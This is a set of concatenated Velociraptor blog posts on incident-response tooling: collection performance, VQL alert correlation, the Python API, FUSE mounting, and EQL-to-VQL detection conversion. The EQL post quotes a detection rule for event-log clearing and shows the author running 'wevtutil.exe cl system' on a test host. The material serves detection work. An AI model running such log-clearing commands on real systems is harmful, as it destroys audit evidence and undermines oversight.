tools like [`analyseMFT.py`](https://github.com/dkovar/analyzeMFT) or
[ntfswalker](https://dmitrybrant.com/ntfswalker) .

In this case we decided to collect the \$MFT from all the Windows hosts
and post-process them offline. Typically the MFT is around 300-400mb and
could be larger. Therefore this artifact collection is about performance
downloading large quantities of data from multiple hosts quickly.

Velociraptor can read the raw NTFS partition and therefore read the
\$MFT file. We wrote the following artifact to just fetch the \$MFT
file:

``` {.sourceCode .yaml}
name: Artifact.NTFS.MFT_puller
description: |
   Uses an NTFS accessor to pull the $MFT

parameters:
- name: path
  default: \\.\C:\$MFT

sources:
- precondition:
    SELECT OS From info() where OS = 'windows'
  queries:
  - SELECT upload(file=path, accessor="ntfs") as Upload from scope()
```

Here is the timing graph for this artifact collection:

![image](MFTDownload.svg)

This collection takes a lot longer on each host as clients are uploading
around 400mb each to the server, but our server was in the cloud so it
had fast bandwidth. Again we see the hosts that are currently up being
tasked within seconds, while as hosts come online gradually we see them
receiving the hunt and a few minutes later uploading their \$MFT file.

Was the frontend loaded at the time? I took a screenshot of top on the
server seconds after launching the hunt:

![image](UploadingMFT.png)

We can see that the CPU load is trivial (4.7%) but the major impact of a
heavy upload collection is the memory used (about 4.7gb - up from about
100mb). The reason is that each client is posting a large buffer of data
(several mb) simultaneously. The server needs to buffer the data before
it can decrypt and process it which takes memory.

In order to limit the amount of memory used, Velociraptor limits the
total number of connections it is actively processing to 8-10 concurrent
connections. By carefully managing concurrency we are able to keep a
limit on server memory use. We may lower the total memory use by
reducing the concurrency (and therefore maybe fit into a smaller VM).
Clients simply wait until the server is able to process their uploaded
buffers. If the server takes too long, the clients automatically back
off and retry to send the same buffer.

Yara scan over the entire filesystem
====================================

The final example of a very intense artifact is to scan the entire
filesystem with a YARA rule. This not only requires traversing the
entire filesystem, but also opening each file and searching it.

One of the dangers with such a scan is that users will be negatively
impacted as their workstations start to read every file on disk! The
main resources a YARA scan consumes is disk IO and CPU load. Users might
complain and blame Velociraptor for their machine being slow (disk IO
may negatively affect performance much more than CPU load!).

However in this case, we don\'t care how long we take to scan the
user\'s system, as long as every file was scanned, and as long as the
endpoint is not overloaded and the user\'s work is not affected. Luckily
Velociraptor allows us to specify the trade-off between collection time
and collection intensity.

Velociraptor rate limiting
--------------------------

Velociraptor controls client side load by rate limiting the client\'s
VQL query. Each VQL plugin consumes an \"operation\" from the throttler.
We define an \"operation\" as a notional unit of work - the heavier the
VQL plugin\'s work, the more operations are consumed. For example for
yara scanning, an operation is defined as 1mb of scanned data, or a
single file if the file is smaller.

When a user issues an artifact collection task, they may limit the rate
at which operations are performed by the client. The Velociraptor agent
then limits the operations to the specified rate. For example, if the
rate is 20 ops/sec then the client will scan less than 20mb per seconds.

Other collections may run concurrently at different rates, though; The
client is not blocked while performing a single artifact collection.
This makes sense since we often need to collect a low priority artifact
slowly, but we do not want this to compromise rapid response to that
host.

For example, one of our targets was a server with large attached
storage. We ran the Yara scan over this system, scanning the first 100Mb
of each file, at a rate of 50 ops/sec. In total we scanned 1.5Tb of
files and the scan took 14 hours (for a total scan rate of 30Mb/sec).

Velociraptor by default collects the Generic.Client.Stats artifact,
which samples the client\'s CPU utilization and memory usage every 10
seconds. These samples are streamed to the server and form a record of
the client\'s footprint on the endpoint. We can use this data to
visualize the effects of performing the yara scan on this host:

![image](cpu_utilization.svg)

Above is the CPU usage on that particular server over the course of a
full day (24 hours). The 14 hour yara scan is clearly visible but at no
time is CPU utilization exceeding 30% of one core. With endpoint disk IO
limited to about 30mb/sec we have achieved a balance between performance
and endpoint load we are happy with.

![image](YaraScanFull.svg)

We can see that most endpoints take approximately an hour to perform
this yara scan, but server load is minimal since the server simply
stores the results of the scans while doing minimal processing.

Conclusions
===========

This post provides some typical numbers for Velociraptor performance in
typical DFIR engagements. We also covered some considerations and
trade-offs we must think about when issuing large artifact collections.
Readers can use these as a guideline in their own deployments - please
comment below about your experiences. Velociraptor is under very active
development and this feedback is important to ensure we put in place the
mechanisms to account for more use cases.

Thanks
------

We would like to thank the folk at
[Klein&Co](https://www.kleinco.com.au/) for their wonderful support and
assistance in Velociraptor development.

---END OF FILE---

======
FILE: /content/blog/html/2019/02/14/alerting_on_event_patterns/_index.md
======
---
date: 2019-02-14T04:10:06Z
description: "We have shown in earlier posts how Velociraptor uses VQL to define
event queries that can detect specific conditions. These conditions
can be used to create alerts and escalation actions."
title: "Alerting on event patterns"
categories: ["Blog"]
---

We have shown in earlier posts how Velociraptor uses VQL to define event
queries that can detect specific conditions. These conditions can be
used to create alerts and escalation actions.

One of the most useful types of alerts is detecting a pattern of
activity. For example we can detect failed and successful login attempts
separately, but it is the specific pattern of events (say 5 failed login
attempts followed by a successful one) that is interesting from a
detection point of view.

This post illustrates how this kind of temporal correlation can be
expressed in a VQL query. We then use it to create alerts for attack
patterns commonly seen by intrusions.

Event Queries
=============

Velociraptor executes queries written in the Velociraptor Query Language
(VQL). The queries can be executed on the client, and their results
streamed to the server. Alternatively the queries may be executed on the
server and process the result of other queries which collected
information from the client.

A VQL query does not have to terminate at all. VQL queries draw their
data from a VQL plugin which may simply return data rows at different
times. For example, consider the following query:

``` {.sourceCode .SQL}
SELECT EventData as FailedEventData,
       System as FailedSystem
FROM watch_evtx(filename=securityLogFile)
WHERE System.EventID = 4625
```

This query sets up a watcher on a windows event log file. As new events
are written to the log file, the query will produce those events as new
rows. The rows will then be filtered so we only see event id 4625
(Failed logon event).

Velociraptor can implement event queries on the client or on the server.
For example, say we wanted to collect all failed event logs with the
query above. We would write an artifact that encapsulates this query:

``` {.sourceCode .yaml}
name: Windows.System.FailedLoginAttempts
parameters:
  - name: securityLogFile
    default: C:/Windows/System32/Winevt/Logs/Security.evtx
sources:
  - queries:
     - SELECT EventData as FailedEventData,
           System as FailedSystem
       FROM watch_evtx(filename=securityLogFile)
       WHERE System.EventID.Value = 4625
```

Then we simply add that artifact to the monitored artifact list in the
config file:

``` {.sourceCode .yaml}
Events:
  artifacts:
  - Generic.Client.Stats
  - Windows.System.FailedLoginAttempts
  version: 2
  ops_per_second: 10
```

The monitored artifacts are run on all clients connected to the server.
The output from these queries is streamed to the server and stored in
the client\'s monitoring VFS directory.

Lets test this artifact by trying to run a command using the runas
windows command. We will be prompted for a password but failing to give
the correct password will result in a login failure event:

![image](1.png)

After a few seconds the event will be written to the windows event log
and the watch\_evtx() VQL plugin will emit the row - which will be
streamed to the VFS monitoring directory on the server, where it can be
viewed in the GUI:

![image](2.png)

The above screenshot shows that the monitoring directory now contains a
subdirectory named after the artifact we created. Inside this directory
are CSV files for each day and every failed logon attempt is detailed
there.

Time correlation
================

While it is interesting to see all failed logon attempts in many cases
these events are just noise. If you put any server on the internet (e.g.
an RDP or SSH server) you will experience thousands of brute force
attempts to break in. This is just the nature of the internet. If your
password policy is strong enough it should not be a big problem.

However, what if someone guesses the password for one of your accounts?
Then the activity pattern is more like a bunch of failed logons followed
by a successful logon for the same account.

This pattern is way more interesting than just watching for a series of
failed logons (although that is also good to know).

But how do we write a query to detect this? Essentially the query needs
to look back in time to see how many failed logon attempts preceded
each successful logon.

This is a typical problem which may be generalized as followed:

::: {.admonition}
Goal

We want to detect an event A proceeded by a specified number of events B
within a defined time window.
:::

This problem may be generalized for example:

1.  Detect a user account created and deleted within a short time
    window.
2.  A beacon to a specific DNS followed by at least 5 beacons within the
    last 5 hours to same DNS (Event A and B are the same).

The fifo() plugin
=================

How shall we write the VQL query to achieve this? This is made possible
by use of the fifo() plugin. As its name suggests, the FIFO plugin acts
as a First In First Out cache for event queries.

![image](3.svg)

The plugin is given a subquery which is also a VQL query generating its
own events. As the subquery generates events, each event is kept in the
fifo plugin\'s cache in a first in first out manner. Events are also
expired if they are too old.

We typically store the query in a variable. Each time the variable is
queried the cache is returned at once. To illustrate how this works
consider the following query:

``` {.sourceCode .text}
LET fifo_events = SELECT * FROM fifo(
  max_rows=5,
  query={
     SELECT * from watch_evtx(filename=securityLogFile)
     WHERE System.EventID.Value = 4625
   })

SELECT * FROM foreach(
   row={
     SELECT * FROM clock(period=60)
   },
   query={
     SELECT * from fifo_events
   })
```

The first query is stored into the fifo\_events variable. When it is
first defined, the fifo() VQL plugin launches its subquery and simply
collects its output into its local cache in a fifo manner. This will
essentially keep the last 5 rows in its cache.

The second query runs the clock() plugin to receive a clock event every
60 seconds. For each of these events, we select from the fifo\_events
variable - that is we select the last 5 failed events.

You can see that this allows us to query the last 5 events in the fifo
cache for every clock event. If we now replace the clock event with a
successful logon event this query will do exactly what we want:

``` {.sourceCode .yaml}
# This query will generate failed logon events - one per row, as
# they occur.
- LET failed_logon = SELECT EventData as FailedEventData,
     System as FailedSystem
  FROM watch_evtx(filename=securityLogFile)
  WHERE System.EventID.Value = 4625

# This query will create a fifo() to contain the last 5 failed
# logon events.
- LET last_5_events = SELECT FailedEventData, FailedSystem
      FROM fifo(query=failed_logon,
                max_rows=5,
                max_age=atoi(string=failedLogonTimeWindow))

# This query simply generates successful logon events.
- LET success_logon = SELECT EventData as SuccessEventData,
     System as SuccessSystem
  FROM watch_evtx(filename=securityLogFile)
  WHERE System.EventID.Value = 4624

# For each successful event, we select the last 5 failed events
# and count them (using the group by). If the count is greater
# than 3 then we emit the row as an event.
- SELECT * FROM foreach(
    row=success_logon,
    query={
     SELECT SuccessSystem.TimeCreated.SystemTime AS LogonTime,
            SuccessSystem, SuccessEventData, FailedEventData,
            FailedSystem, count(items=SuccessSystem) as Count
     FROM last_5_events
     WHERE FailedEventData.SubjectUserName = SuccessEventData.SubjectUserName
     GROUP BY LogonTime
    })  WHERE Count > 3
```

The above query simply watches the event log for failed logins and
populates a fifo() with the last 5 failed events. At the same time we
monitor the event log for successful logon events. If we see a
successful event, we go back and check the last 5 failed events and
count them.

If the failed events are for the same user and there are more than 3
then we report this as an event. We now have a high value event.

Let\'s see what it looks like when such an event is triggered:

![image](3.png)

Just like before, the events are written to a daily CSV log, one event
per CSV row. It is a bit hard to see in the GUI since there is a lot of
data, (We probably need some GUI work to improve this) but there is a
single row emitted for each event, and the FailedEventData column
contains a list of all the failed login attempts stored in the fifo().

Server side queries.
====================

We have seen how the fifo() plugin can be used in the monitoring
artifact itself to have the client detect its own events. However, the
endpoint is usually only able to see its own events in isolation. It
would be nice to be able to detect patterns only evident by seeing
concerted behaviour from multiple endpoints at the same time.

For example, consider the pattern of an attacker who compromised domain
credentials running multiple PowerShell Remoting commands across the
entire domain. A command like:

``` {.sourceCode .text}
PS C:\WINDOWS\system32> Invoke-Command –ComputerName testcomputer -ScriptBlock {Hostname}
TestComputer
```

This command will generate multiple event log entries, including event
4624 (logon) on each host. While in isolation, on each individual
endpoint this event is not suspicious, we might consider seeing this
event repeated within a short time across the domain suspicious.

To set that up we would run the following artifact as a monitoring
artifact on all endpoints:

``` {.sourceCode .yaml}
name: Windows.Event.SuccessfulLogon
sources:
 - queries:
   - SELECT EventData as SuccessEventData,
        System as SuccessSystem
     FROM watch_evtx(filename=securityLogFile)
     WHERE System.EventID.Value = 4624
```

On the server we simple install a watcher on all monitoring events from
this artifact and feed the result to the fifo(). This fills the fifo()
with the last 500 successful logon events from all clients within the
last 60 seconds:

``` {.sourceCode .SQL}
LET last_successful_logons = SELECT * FROM fifo(
   max_rows=500,
   max_time=60,
   query={
     SELECT * FROM watch_monitoring(
        artifact="Windows.Event.SuccessfulLogon")
   })
```

By counting the number of such unique events we can determine if there
were too many successful logon events from different hosts within the
last minute. This might indicate a scripted use of powershell remoting
across the domain.

Conclusions
===========

In this post we have seen how to write artifacts which capture a time
ordered pattern of behavior. This technique is useful to codify common
attack techniques. The technique is general and we can use the same idea
on server side queries to correlate events from many hosts at the same
time.

---END OF FILE---

======
FILE: /content/blog/html/2019/02/09/velociraptor_python_api/_index.md
======
---
date: 2019-02-09T04:10:06Z
description: "Velociraptor usually is only a part of a wider solution
which might include a SIEM and SOC integration. In order to facilitate
interoperability with other tools, Velociraptor now offers an external
API."
title: "The Velociraptor Python API"
categories: ["Blog"]
---

{{% notice warning %}}

The Python bindings described in this page have now moved to https://github.com/Velocidex/pyvelociraptor/

{{% /notice %}}


Velociraptor is very good at collecting artifacts from endpoints.
However, in modern DFIR work, the actual collection is only the first
step of a much more involved process. Typically we want to post process
data using more advanced data mining tools (such as data stacking).
Velociraptor usually is only a part of a wider solution which might
include a SIEM and SOC integration.

In order to facilitate interoperability with other tools, Velociraptor
now offers an external API. The API is offered via gRPC so it can be
used in any language which gRPC supports (e.g. Java, C++, Python etc).
In this blog post we illustrate the Python API but any language should
work.

The Velociraptor API Server
===========================

The API server exposes an endpoint ready to accept gRPC connections. By
default the API server listen only on the loopback interface (127.0.0.1)
but it is easy to change to be externally accessible if you need by
changing the server.config.yaml file:

``` {.sourceCode .yaml}
API:
  bind_address: 127.0.0.1
  bind_port: 8001
```

Client programs simply connect directly to this API and call gRPC
methods on it.

![](api_diagram.png)

The connection is encrypted using TLS and authenticated using mutual
certificates. When we initially created the Velociraptor configuration
file, we created a CA certificate and embedded it in the
server.config.yaml file. It is this CA certificate which is used to
verify that the certificate each end presents was issued by the
Velociraptor CA.


{{% notice note %}}

If you need to have extra security in your environment you should keep
the original server.config.yaml file generated in an offline location,
then deploy a redacted file (without the CA.private\_key value) on the
server. This way api client certificates can only be issued offline.

{{% /notice %}}

Before the client may connect to the API server they must have a
certificate issued by the Velociraptor CA. This is easy to generate:

``` {.sourceCode .bash}
$ velociraptor --config server.config.yaml \
     config api_client --name Fred > api_client.yaml
```

Will generate something like:

``` {.sourceCode .yaml}
ca_certificate: |
  -----BEGIN CERTIFICATE-----
  MIIDITCCAgmgAwIBAgIRAI1oswXLBFqWVSYZx1VibMkwDQYJKoZIhvcNAQELBQAw
  -----END CERTIFICATE-----
client_cert: |
  -----BEGIN CERTIFICATE-----
  2e1ftQuzHGD2XPquqfuVzL1rtEIA1tiC82L6smYbeOe0p4pqpsHN1sEDkdfhBA==
  -----END CERTIFICATE-----
client_private_key: |
  -----BEGIN RSA PRIVATE KEY-----
  sVr9HvR2kBzM/3yVwvb752h0qDOYDfzLRENjA7dySeOgLtBSvd2gRg==
  -----END RSA PRIVATE KEY-----
api_connection_string: 127.0.0.1:8001
name: Fred
```

The certificate generated has a common name as specified by the \--name
flag. This name will be logged in the server\'s audit logs so you can
use this to keep track of which programs have access. This file keeps
both private key and certificate as well as the CA certificate which
must be used to authenticate the server in a single file for
convenience.

Using the API from Python
=========================

Although the API exposes a bunch of functions used by the GUI, the main
function (which is not exposed through the GUI) is the Query() method.
This function simply executes one or more VQL queries, and streams their
results back to the caller.

The function requires an argument which is a protobuf of type
VQLCollectorArgs:

``` {.sourceCode .yaml}
VQLCollectorArgs:
     env:  list of VQLEnv(string key, string value)
     Query: list of VQLRequest(string Name, string VQL)
     max_row: int
     max_wait: int
     ops_per_second: float
```

This very simple structure allows the caller to specify one or more VQL
queries to run. The call can set up environment variables prior to the
query execution. The max\_row and max\_wait parameters indicate how many
rows to return in a single result set and how long to wait for
additional rows before returning a result set.

The call simply executes the VQL queries and returns result sets as
VQLResponse protobufs:

``` {.sourceCode .yaml}
VQLResponse:
   Response: json encoded string
   Columns: list of string
   total_rows: total number of rows in this packet
```

The VQL query may return many responses - each represents a set of rows.
These responses may be returned over a long time, the API call will
simply wait until new responses are available. For example, the VQL may
represent an event query - i.e. watch for the occurrence of some event
in the system - in this case it will never actually terminate, but keep
streaming response packets.

How does this look like in code?
================================

The following will cover an example implementation in python. The first
step is to prepare credentials for making the gRPC call. We parse the
api\_config yaml file and prepare a credential object:

``` {.sourceCode .python}
config = yaml.load(open("api_client.yaml").read())
creds = grpc.ssl_channel_credentials(
     root_certificates=config["ca_certificate"].encode("utf8"),
     private_key=config["client_private_key"].encode("utf8"),
     certificate_chain=config["client_cert"].encode("utf8"))

options = (('grpc.ssl_target_name_override', "VelociraptorServer",),)
```

Next we connect the channel to the API server:

``` {.sourceCode .python}
with grpc.secure_channel(config["api_connection_string"],
                         creds, options) as channel:
    stub = api_pb2_grpc.APIStub(channel)
```

The stub is the object we use to make calls with. We can then issue our
call:

``` {.sourceCode .python}
request = api_pb2.VQLCollectorArgs(
         Query=[api_pb2.VQLRequest(
             VQL=query,
         )])

for response in stub.Query(request):
    rows = json.loads(response.Response)
    for row in rows:
        print(row)
```

We issue the query and then just wait for the call to generate response
packets. Each packet may contain several rows which will all be encoded
as JSON in the Response field. Each row is simply a dict with keys being
the column names, and the values being possibly nested dicts or simple
data depending on the query.

What can we do with this?
=========================

The Velociraptor API is deliberately open ended - meaning we do not pose
any limitations on what can be done with it. It is conceptually a very
simple API - just issue the query and look at the results, however this
makes it extremely powerful.

We already have a number of very useful server side VQL plugins you can
use. We also plan to add a number of other plugins in future -this means
that the Velociraptor API can easily be extended in a backwards
compatible way by simply adding new VQL plugins. New queries can do
more, without breaking existing queries.

Post process artifacts
----------------------

This is the most common use case for the API. Velociraptor deliberately
does not do any post processing on the server - we don\'t want to slow
the server down by making it do more work than necessary.

But sometimes users need to do some more with the results - for example
upload to an external system, check hashes against Virus Total, and even
initiate an active response like escalation or disruption when something
is detected.

In a recent engagement we needed to collect a large number of \$MFT
files from many endpoints. We wanted to analyze these using external
tools like `analyseMFT.py`.

We wrote a simple artifact to collect the MFT:

``` {.sourceCode .yaml}
name: Windows.Upload.MFT
description: |
   Uses an NTFS accessor to pull the $MFT

parameters:
  - name: path
    default: \\.\C:\$MFT

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    queries:
    - select upload(file=path, accessor="ntfs") as Upload from scope()
```

We then created a hunt to collect this artifact from the machines of
interest. Once each \$MFT file is uploaded we need to run `analyseMFT.py`
to parse it:

``` {.sourceCode .python}
QUERY="""
  SELECT Flow,
         file_store(path=Flow.FlowContext.uploaded_files) as Files
  FROM  watch_monitoring(artifact='System.Flow.Completion')
  WHERE 'Windows.Upload.MFT' in Flow.FlowContext.artifacts
"""

with grpc.secure_channel(config["api_connection_string"],
                         creds, options) as channel:
    stub = api_pb2_grpc.APIStub(channel)
    request = api_pb2.VQLCollectorArgs(
        Query=[api_pb2.VQLRequest(
            VQL=QUERY,
        )])

    for response in stub.Query(request):
        rows = json.loads(response.Response)
        for row in rows:
            for file_name in row["Files"]:
                 subprocess.check_call(
                    ["analyseMFT.py", "-f", file_name,
                     "-o", file_name+".analyzed"])
```

The previous code sets up a watcher query which will receive every
completed flow on the server which collected the artifact
\"Windows.Upload.MFT\" (i.e. each completed flow will appear as a row to
the query).

We can have this program running in the background. We can then launch a
hunt collecting the artifact, and the program will automatically process
all the results from the hunt as soon as they occur. When new machines
are turned on they will receive the hunt, have their \$MFT collected and
this program will immediately process that.

Each flow contains a list of files that were uploaded to it. The
file\_store() VQL function reveals the server\'s filesystem path where
the files actually reside. The server simply stores the uploaded files
on its filesystem since Velociraptor does not use a database (everything
is a file!).

The python code then proceeds to launch the `analyseMFT.py` script to
parse the \$MFT.

{{% notice note %}}


The nice thing with this scheme is that the `analyseMFT.py` is running in
its own process and can be managed separately to the main Velociraptor
server (e.g. we can set its execution priority or even run it on a
separate machine). The Velociraptor server does not actually need to
wait for post processing nor will the post processing affect its
performance in any way. If the `analyseMFT.py` script takes a long time,
it will just fall behind but it eventually will catch up. In the
meantime, the Velociraptor server will continue receiving the uploads
regardless.

{{% /notice %}}

The above example sets up a watcher query to receive flow results in
real time, but you can also just process the results of a specific hunt
completely using a query like:

``` {.sourceCode .sql}
SELECT Flow, file_store(path=Flow.FlowContext.uploaded_files) as Files
FROM hunt_flows(hunt_id=huntId)
```

Conclusions
===========

The Velociraptor python API opens up enormous possibilities for
automating Velociraptor and interfacing it with other systems. Combining
the power of VQL and the flexibility (and user familiarity) of Python
allows users to build upon Velociraptor in a flexible and creative way.
I am very excited to see what the community will do with this feature -
I can see integration with ELK, BigQuery and other data analytic engines
being a valuable use case.

Please share your experiences in the comments or on the mailing list at
<velociraptor-discuss@groups.google.com>.

---END OF FILE---

======
FILE: /content/blog/html/2019/08/28/the_velociraptor_api.md
======
---
date: 2019-08-26
description:  |
  We have previously shown how the Velociraptor API provides a
  powerful mechanism to integrate and automate. In this post we
  demonstrate an example of a program which takes advantage of the API
  to present the client's VFS as a FUSE filesystem.

title: The Velociraptor API and FUSE
categories: ["Blog"]
---

{{% notice warning %}}

This page is written about a very old version of Velociraptor and is
retained for historical purposes. Currently the fuse feature was removed.

{{% /notice %}}


The Velociraptor GUI is very useful, but for the power user, the
Velociraptor API provides a powerful mechanism to integrate and
automate. We previously discussed how the Velociraptor API can be used
by external programs. This post explore a sample program that uses the
API and presents a client's VFS as a FUSE directory.

This allows us to navigate the remote end point's file system as if it
was mounted locally - we can list directories or fetch files, or even
open remote files using third party programs. All the while, these
actions are fully audited on the server and the collected files are
stored in Velociraptor's file store for archiving and evidence
preservation.

## Overview

Consider an analyst investigating an end point. The analyst has some
third party tools on their workstation which they would like to use on
files obtained from the end point.

Filesystem in Userspace (FUSE) is a way of creating the illusion of a
real filesystem using software. When various programs on the computer
requests filesystem operations, such as listing files in a directory
or reading a file, Velociraptor takes over and emulates these
requests.

Velociraptor's built in FUSE program emulates a filesystem by
exporting a client's cached VFS on the server to the FUSE layer. If
the analyst attempts to list a directory that the server has no cache
of - the server will issue a new directory listing request from the
endpoint. If the endpoint is currently online, the updated directory
listing will be returned to the server, and in turn relayed to the
analyst's workstation.

The overall effect is that as the analyst navigates around the FUSE
filesystem on their workstation, they are issuing collection requests
from the endpoint, and reading their responses in such as way that it
appears the endpoint is really mounted on the FUSE filesystem.

![Image](../Fuse overview.png)

The above figure shows all the components and how they are
related. Assume the FUSE filesystem is mounted on drive `Q:` in the
analyst's workstation:

1. Suppose the analyst is navigating the file `Q:\file\` using Windows
   Explorer.

2. Velociraptor's FUSE program running on the analyst workstation will
   issue an API request to list the `file` directory within the
   client's VFS on the server.

3. If the server has a locally cached version of this VFS directory in
   its data store it will return it immediately.

4. However, if no server side cache exists, the FUSE program will
   issue a directory listing request to the endpoint.

5. The endpoint will respond to this and return the directory listing
   (if it is currently online).

6. Now the server will contain a cached copy of the VFS directory and
   can return it (just as in step 3 above).

7. The Velociraptor FUSE program on the workstation can return the
   directory listing to the Windows kernel and this will be fed back
   into the Windows Explorer. The end result is that Windows Explorer
   appears to be navigating the endpoint's filesystem directly.

You can see this process in the screenshot below:

![Image](../fuse.png)

{{% notice tip %}}

Do not run the fuse API command as a different user to what is
currently logged in (e.g. do not run as Administrator). If you do then
you will not be able to see the FUSE drive in your user's desktop
session.

For example if you are logged in as user "Test", then any FUSE drives
created by Velociraptor running as user Test are only visible to user
Test. If you run the above command as an elevated UAC prompt then user
Test will be unable to see the new drive.

{{% /notice %}}


### Running the FUSE program

On Windows filesystem in userspace is implemented by the `WinFSP`
project. You will need to
[download](http://www.secfs.net/winfsp/download/) and install it
first.

We require an API key to use the fuse feature so generate one first on
the server:

```
   $ velociraptor --config server.config.yaml \
        config api_client --name FUSE > api_client.yaml
```

Now simply copy the generate `api_client.yaml` file to the analyst's
workstation. You can mount any client's VFS by simply specifying its
client id and a drive letter to access it:

```
C:\Program Files\Velociraptor>Velociraptor.exe --api_config f:\api_client.yaml -v fuse q: C.8b6623b1d7c42adf
The service Velociraptor has been started.
[INFO] 2019-08-26T14:12:28Z Initiating VFSRefreshDirectory for /file/C:/Go/ (aff4:/clients/C.8b6623b1d7c42adf/flows/F.BLHUHJ0RDGCRU)
[INFO] 2019-08-26T14:12:28Z Flow for /file/C:/Go/ still outstanding (aff4:/clients/C.8b6623b1d7c42adf/flows/F.BLHUHJ0RDGCRU)
...
```

Simply press Ctrl-C to stop the FUSE program as any time.

## Conclusions

The FUSE feature is a perfect example of a useful API program. The
program fully automates the Velociraptor server - it received cached
information about the client's VFS status, and then automatically
issues new collection requests as needed.

This kind of automated control of the Velociraptor server opens the
door to many such applications. From automated response to
remediation and automated evidence collection.

{{% notice note %}}

Some users has asked us what the difference between the FUSE program
and other tools, e.g. F-Response which also create the illusion that
the remote system is mounted on the analyst's workstation. The main
difference is that Velociraptor does not export the *raw block device*
from the endpoint - it simply exports the files and directories we
collected already. So for example, it is not possible to run a low
level disk analysis system (such as X-Ways) on the mounted FUSE
drive. However you can still run specialized file parsers (such as
Kape or log2timeline) as long as they do not require access to the raw
devices.

{{% /notice %}}

---END OF FILE---

======
FILE: /content/blog/2021/2021-11-09-eql2vql/_index.md
======
---
title: "EQL to VQL - Leverage EQL based detection rules in Velociraptor"
description: |
   There is a large body of existing work in detection queries and
   threat intelligence designed to work on top of a central data
   mining solution such as Elastic and its Event Query Language (EQL).
   By reusing existing detection resources within Velociraptor we are
   able to apply these in different contexts, enhancing their overall
   effectiveness.

tags:
 - Detection
 - VQL
 - ETW

author: "Mike Cohen"
date: 2021-11-09
---

{{% notice warning "Outdated content" %}}

This article describes a threat detection approach that has since been
superseded by Velociraptor's [built-in Sigma
functionality]({{<ref "/blog/2023/2023-11-15-sigma_in_velociraptor" >}}),
however it is retained here for historical and instructive purposes since it
also demonstrates how the flexibility of VQL makes novel solutions possible.

{{% /notice %}}

If you have been following the development of Velociraptor for a while
you are probably more than familiar with Velociraptor's flexible query
language (VQL). Because Velociraptor is an agent running on the
endpoint, VQL facilitates access to all manners of data sources, from
event logs, event tracing for Windows (ETW) to live analysis and
triaging - all orchestrated using VQL as the flexible glue language.

While VQL can be used for hunting or detection, many traditional
threat hunting platforms work by forwarding logs to a central location
and then running queries over the aggregate data from all
endpoints. There is a large body of existing work in detection queries
or threat intelligence feeds designed to work on top of a central data
mining solution such as Elastic or Splunk. We have been wondering for
a while how to make use of that existing logic within Velociraptor. By
reusing existing detection resources in different contexts, we are
able to enhance their overall effectiveness.

In this post we discuss how to leverage detections targeting EQL (an
Elastic search query) within Velociraptor. I thought it would also be
interesting to discuss the main differences between more traditional
logs aggregation solutions (such as Elastic or Splunk) and
Velociraptor's endpoint centric design.

## What is EQL anyway?

The [Event Query
Language](https://www.elastic.co/blog/introducing-event-query-language)
(EQL), is a query language designed to identify specific conditions in
collected telemetry from endpoints in order to implement detections of
anomalous behavior.

EQL forms a central part of the Elastic detection platform and has a
large number of [existing detection
rules](https://github.com/elastic/detection-rules). It is also a
target for some other threat detection platforms, for example
[Sigma](https://github.com/SigmaHQ/sigma) can generate EQL queries
from Sigma rules.

By implementing EQL support for Velociraptor we can leverage the
existing resources and use them in a wider context - as we will see
below.

## How do EQL detections work?

EQL detections are part of the wider Elastic solution - which is
pretty typical for traditional centrally processed SIEM based systems:

1. Events are collected from the endpoint using a collection
   agent. Commonly the agent is
   [winlogbeat](https://www.elastic.co/beats/winlogbeat) collecting
   [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
   generated events, providing process execution logs, file and
   registry modification events and DNS lookup events.

2. The data is transformed on the endpoint into a standard data schema
   for transmission into the Elastic server. EQL relies on the data being in
   [Elastic Common
   Schema](https://www.elastic.co/guide/en/ecs/current/index.html) so
   it can be indexed by the backend.

3. The transformed data is received on the server and fed into large
   scale data mining warehouse (e.g. The Elastic search server) where
   it is aggregated and indexed.

4. Detection queries are applied on the data mining engine to detect
   anomalies.

The following diagram illustrates the process

![Life of an EQL event](eql_lifecycle.png)

Let's work through a specific example of a Sysmon event as it works
its way through the EQL echo-system, eventually matching the
[following
detection](https://github.com/elastic/detection-rules/blob/main/rules/windows/defense_evasion_clearing_windows_event_logs.toml):

```py
process where event.type in ("process_started", "start") and
  (process.name : "wevtutil.exe" or process.pe.original_file_name == "wevtutil.exe") and
    process.args : ("/e:false", "cl", "clear-log") or
   process.name : ("powershell.exe", "pwsh.exe", "powershell_ise.exe") and process.args : "Clear-EventLog"
```

The above rule is looking for process executions, where the
`wevtutil.exe` program is run with command line arguments matching
"cl" or "clear-log" (Or the equivalent powershell)

What happens when I run the command `wevtutil.exe cl system` on my
test system?

Sysmon will detect the process start and write an event into the
system event log.

![A typical Sysmon Event](sysmon_event.png)

Eventually the event will be forwarded to the Elastic stack, detection
queries run over it and potentially an alert will be escalated.

Since we know this event will trigger the EQL detection, let's see how
Sysmon event fields are mapped into the ECS fields that the EQL query
works on.


| Sysmon Field | ECS Field |
|--------------|-----------|
| System.EventID | maps to event.type = "start" |
| EventData.Image | strip directory part and store in `process.name` |
| EventData.OriginalFileName | stored in `process.pe.original_file_name` |
| EventData.CommandLine | is split into array and stored in `process.args` |
-------

All the details of how the original Sysmon event fields are
transformed to ECS fields can be found coded in
[winlogbeat-sysmon.js](https://github.com/elastic/beats/blob/master/x-pack/winlogbeat/module/sysmon/config/winlogbeat-sysmon.js)

## How can we use EQL detection queries?

So now that we understand how EQL detections work, how can we use the
same detection logic in Velociraptor? Velociraptor's philosophy is
that detection should be distributed - rather than forwarding all raw
events to a central place for triaging, we wish to be able to do the
detection directly on the endpoint.

In order to do this, we need to convert the EQL to VQL that works
directly on the raw source event logs as produced by Sysmon - in other
words we need to reverse the above transformation from the ECS fields
mentioned in the EQL query back to the original event log fields found
on the endpoint.

### The `eql2vql` project

Let me introduce a new project to automatically convert EQL detection
rules to VQL artifacts: https://github.com/Velocidex/eql2vql

The aim of this project is to automatically produce a VQL artifact
that parses a set of EQL detection rules into a single VQL
artifact. The produced artifact can be used to hunt for notable event
log patterns at scale in minutes using Velociraptor's hunting
capabilities!

Let's take a look at an example to illustrate how it works. I will
keep it simple and just convert the single rule
`defense_evasion_clearing_windows_event_logs.toml` containing the
sample EQL query above, to create a new VQL artifact

```sh
$ python3 parser/eql2vql.py -p SysmonEVTXLogProvider ~/projects/detection-rules/rules/windows/defense_evasion_clearing_windows_event_logs.toml -o /tmp/detection_vql.yaml
Created artifact 'Windows.Sysmon.Detection' with 1 detections
```

In this case I selected the `SysmonEVTXLogProvider` as I wanted to
search the EVTX files directly on the endpoint.

